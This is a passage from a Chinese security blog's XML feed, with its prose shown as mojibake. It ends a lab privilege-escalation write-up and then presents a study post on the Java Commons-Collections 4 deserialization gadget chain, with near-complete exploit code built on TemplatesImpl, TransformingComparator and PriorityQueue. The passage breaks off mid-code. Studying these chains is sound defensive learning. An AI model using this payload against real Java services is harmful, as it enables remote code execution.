æƒ¯æ‰¾äº†åŠå¤©åšå®¢ä¼¼ä¹éƒ½æ²¡å¸ˆå‚…é‡åˆ°è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®è¿™é‡Œå°±æ˜¯glibcç‰ˆæœ¬é—®é¢˜ï¼Œæˆ‘kalié»˜è®¤ä½¿ç”¨äº†2.34è¿™ä¸ªç‰ˆæœ¬ï¼Œè€Œé¶æœºæ ¹æœ¬æ²¡æœ‰è¿™ä¸ªç‰ˆæœ¬<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061528312.png" alt="image-20230706152807259"><br>æ‰€ä»¥ä¸€ç›´æŠ¥é”™ï¼Œåé¢æŠŠ<code>rootshell.c</code>æ”¾åˆ°é¶æœºä¸Šé¢ç¼–è¯‘ç„¶åå†æ‰§è¡Œrun.shæˆåŠŸææƒï¼Œé‡åˆ°é—®é¢˜è¿˜æ˜¯è¦å…ˆåˆ†æä¸€ä¸‹æŠ¥é”™å•Š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061528826.png" alt="image-20230706152818770"><br>ä¸Šé¢çš„eximæˆ‘è¯•äº†<code>4.84.3</code>è¿™ä¸ªç‰ˆæœ¬ä½†æ˜¯å¤±è´¥äº†ï¼Œé¶æœºæ˜¯<code>4.84.2</code>ä½†æ˜¯msfæ²¡æœ‰expæœ€ç»ˆå¤±è´¥äº†</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾4</title>
      <link href="/undefined/45591.html"/>
      <url>/undefined/45591.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>å…¶å®ƒçš„å’Œå‰é¢ä¸€æ ·ï¼Œåªä¸è¿‡Commons-Collections ä¾èµ–å˜ä¸ºäº†4.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>åœ¨CC4ä¸Šå°¾éƒ¨çš„å‘½ä»¤æ‰§è¡Œæ²¡æœ‰ä»€ä¹ˆå˜åŒ–åå°„æˆ–è€…åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œæ”¹å˜çš„æ˜¯CC4å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œé‚£ä¹ˆInvokerTransformerç”¨ä¸äº†äº†å°±è¦æ‰¾è°è°ƒç”¨äº†<code>transform()</code>éšä¾¿ç”¨ä¸ªç±»ç„¶åfind usages <code>transform()</code>è¿™é‡Œæœ€ç»ˆæ‰¾çš„æ˜¯<code>TransformingComparator</code> ç±»ä¸­çš„<code>compare</code>æ–¹æ³•è°ƒç”¨äº†<code>transform()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247478.png" alt="image-20230705124539354"><br><code>compare</code>æ–¹æ³•åœ¨Javaä¸­ä¹Ÿæ˜¯å¸¸ç”¨çš„ï¼Œç”¨äºä¸¤ä¸ªå¯¹è±¡çš„å¤§å°æ¯”è¾ƒï¼Œç»§ç»­å¾€å‰æ‰¾çœ‹è°è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œç›´æ¥find usagesæ‰¾ä¸åˆ°ï¼Œçœ‹ç»„é•¿è§†é¢‘è¯´å¾—å¯¹å¼€å‘æ¯”è¾ƒç†Ÿæ‚‰ï¼Œå¼€å‘æˆ‘æ˜¯ä¸€ç‚¹ä¸ç†Ÿå•Šï¼Œéš¾å—ï¼Œæœ€åç›´æ¥ç»™å‡ºäº†<code>PriorityQueue</code>ç±»ç”¨äºä¼˜å…ˆé˜Ÿåˆ—çš„æ“ä½œï¼Œåœ¨è¿™ä¸ªç±»ä¸­è°ƒç”¨äº†<code>compare</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247664.png" alt="image-20230705124731533"><br>ç„¶åç»§ç»­å¾€ä¸Šæ‰¾æ‰¾åˆ°äº†è¿™ä¸ªç±»ä¸­çš„readObjectæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247635.png"><br>é‚£ä¹ˆå…¶å®åˆ°è¿™é‡Œå¯ä»¥çœ‹åˆ°å…¥å£ç±»å°±å˜äº†ï¼Œé“¾å­åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œæ¥ä¸‹æ¥ç¼–å†™EXP</p><h2 id="EXPç¼–å†™"><a href="#EXPç¼–å†™" class="headerlink" title="EXPç¼–å†™"></a>EXPç¼–å†™</h2><p>å…ˆæŠŠåé¢çš„åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œå†™å‡ºæ¥ï¼Œå’ŒCC3ä¸€æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œ  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆåŠŸ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247890.png" alt="image-20230705124756650"><br>ç„¶åå°±æ˜¯æ”¾å¼ƒ<code>InvokerTransformer</code>è½¬ç”¨<code>TransformingComparator</code> ç±»çš„ <code>compare()</code>æ–¹æ³•ï¼Œå†ç”¨PriorityQueueç±»å½“å…¥å£å»è°ƒç”¨ï¼Œç„¶åå¯¹PriorityQueueåºåˆ—åŒ–ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œ  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">        serialize(priorityQueue);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œå¼¹å‡ºè®¡ç®—å™¨å¤±è´¥è¯´æ˜ä¸­é—´å‡ºäº†é—®é¢˜ï¼Œdebugä¸€ä¸‹ï¼Œæ–­ç‚¹å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248413.png" alt="image-20230705124810172"><br>é—®é¢˜å‡ºåœ¨ä¸‹é¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248848.png" alt="image-20230705124816746"><br>è°ƒè¯•å‘ç°å¹¶æ²¡æœ‰è¿›å…¥<code>siftDown</code>æ–¹æ³•ï¼Œè€Œæˆ‘ä»¬è¦æ±‚å°±æ˜¯è¦è¿›å…¥ï¼Œå¯»æ‰¾ä¸€ä¸‹åŸå› </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br></pre></td></tr></table></figure><p>å½“ä»£ç èµ°åˆ°è¿™é‡Œçš„æ—¶å€™sizeä¸º0ï¼Œå½“sizeä¸º1çš„æ—¶å€™å³ç§»1ä½è¿˜æ˜¯0<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248594.png" alt="image-20230705124853515"><br>å½“sizeä¸º2å³å¯å¾—åˆ°1è¿›å…¥forå¾ªç¯ï¼Œè€Œè¿™ä¸ªsizeå°±æ˜¯é˜Ÿåˆ—çš„é•¿åº¦ï¼Œé‚£ä¹ˆæˆ‘å¾€è¿™ä¸ªé˜Ÿåˆ—é‡Œé¢åŠ ç‚¹ä¸œè¥¿å°±è¡Œäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);  </span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051249225.png" alt="image-20230705124905041"><br>æ­¤æ—¶å¼¹å‡ºè®¡ç®—å™¨äº†ï¼Œä½†æ˜¯è¿™é‡ŒæŠ¥é”™ï¼Œå½“æˆ‘æŠŠåºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ³¨é‡Šä¹‹åè¿˜æ˜¯å¼¹äº†è®¡ç®—å™¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061925481.png" alt="image-20230706192532303"><br>è¯´æ˜è¿™ä¸ªè®¡ç®—å™¨å¼¹çš„å’Œåºåˆ—åŒ–æ²¡å…³ç³»ï¼Œé—®é¢˜å°±å‡ºåœ¨äº†è¿™ä¸ª<code>priorityQueue.add(1);</code>è·Ÿè¿›å»çœ‹ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061925964.png" alt="image-20230706192237127"><br>å‘ç°è¿™ä¸ªaddç›´æ¥ä¼šè¿›å…¥åˆ°compareæ–¹æ³•ï¼Œç›´æ¥å°±åœ¨æœ¬åœ°æ‰§è¡Œäº†æ²¡ç©çš„äº†ï¼Œæ‰€ä»¥å¾—é¿å…æœ¬åœ°æ‰§è¡Œ<br>æŠ¥é”™çš„åŸå› å…¶å®æ˜¯CC3é‡Œçš„<code>_tfactory</code> å€¼ï¼Œéƒ½å¿˜äº†è¿™æ˜¯å¹²å˜›çš„äº†ï¼Œåœ¨å‰é¢çš„expä¸­å°‘äº†ä¸€å¥<code>templates.newTransformer();</code>å¯¼è‡´æŠ¥é”™åŠ ä¸Šå°±è¡Œäº†å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>ä½†å…¶å®è¿™é‡Œæ ¹æœ¬æ²¡å•¥å…³ç³»ï¼Œæœ¬æ¥å°±ä¸æƒ³è®©å®ƒåœ¨æœ¬åœ°æ‰§è¡Œï¼Œè§£å†³addçš„é—®é¢˜å’Œå‰é¢CC1ï¼ˆå¥½åƒæ˜¯ä¸è®°å¾—äº†ï¼‰ä¸€æ ·æŠŠ<code>transformingComparator</code> çš„å€¼æ”¹ä¸ºä¸€ä¸ªæ— å…³çš„å¯¹è±¡ï¼Œåœ¨ add å®Œä¹‹åå†ç”¨åå°„ä¿®æ”¹å›æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œ  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title 